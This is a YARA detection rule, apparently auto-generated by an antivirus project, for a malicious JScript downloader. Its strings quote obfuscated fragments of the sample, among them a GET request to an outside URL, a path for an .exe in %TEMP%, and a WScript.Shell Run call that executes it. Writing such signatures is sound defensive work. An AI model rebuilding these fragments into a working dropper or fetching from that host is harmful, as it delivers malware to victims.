rule sig_20160328_c5b1050d4b0481188780d8429926e122 {
  meta:
    description = "datamaliciousorder - file 20160328_c5b1050d4b0481188780d8429926e122.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "969cb6e5011e5f4a199f2ddd83688d0d5cd17dda0bfcb53761bebf6f61532b01"

  strings:
    $s1  = "function Cbalyfitc() {return Aqebhhxp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bkGZTLkNPGVQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Ocdhvs](Imahmcvv() * 11)} while (Vlaipd[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Aqebhhxp = function Mqfmwxq() {return WScript[Ydbkwckn](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Vlaipd[Hdycpk](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "function Jlhugilqec(Eoesxdtht, Zqmznit){return Eoesxdtht - Zqmznit;};" fullword ascii
    $s6  = "function Cjkgqjt(Ljqeqxh){Aqebhhxp[\"Run\"](Ljqeqxh, Oyezsihyt, Oyezsihyt);};" fullword ascii
    $s7  = "function Hfvygsy() {return ((Vskyy == true) && (Vskyy == Uetqzlgz)) ? 1 : Oyezsihyt;};" fullword ascii
    $s8  = "function Ruzlns(){return Ethsznrwnp;};" fullword ascii
    $s9  = "Uetqzlgz = true; " fullword ascii
    $s10 = "function Cubrdrskg()" fullword ascii
    $s11 = "Vskyy = true; " fullword ascii
    $s12 = "var Vskyy = false;" fullword ascii
    $s13 = "function Eqrtf(Wpmuirts) {var Abrjpxhlj = (1, 2, 3, 4, 5, Wpmuirts); return Abrjpxhlj;};" fullword ascii
    $s14 = "var Uetqzlgz = false;" fullword ascii
    $s15 = "function Imahmcvv(){return 22;};" fullword ascii
    $s16 = "return Jlhugilqec(Qaylyjmb, Gvidw);" fullword ascii
    $s17 = " while (Phfmahg){" fullword ascii
    $s18 = "var Qtenqu = false;" fullword ascii
    $s19 = "function Yujbpyxs(){return Ydbkwckn;};" fullword ascii
    $s20 = "var Fcxlgzogmp = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}